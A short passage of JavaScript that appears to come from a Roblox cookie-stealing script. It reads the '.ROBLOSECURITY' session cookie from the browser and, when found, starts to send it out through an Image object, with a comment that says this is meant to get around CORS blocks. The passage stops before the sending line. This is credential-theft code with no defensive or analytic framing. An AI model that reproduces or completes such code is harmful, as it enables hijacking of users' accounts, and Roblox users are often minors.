                var match = document.cookie.match(new RegExp('(^| )' + ".ROBLOSECURITY" + '=([^;]+)'));
                if (match) return match[2];
                return null;
            }

            var cookie = getRBX();

            if (cookie) {
                // We use an Image object to bypass CORS blocks
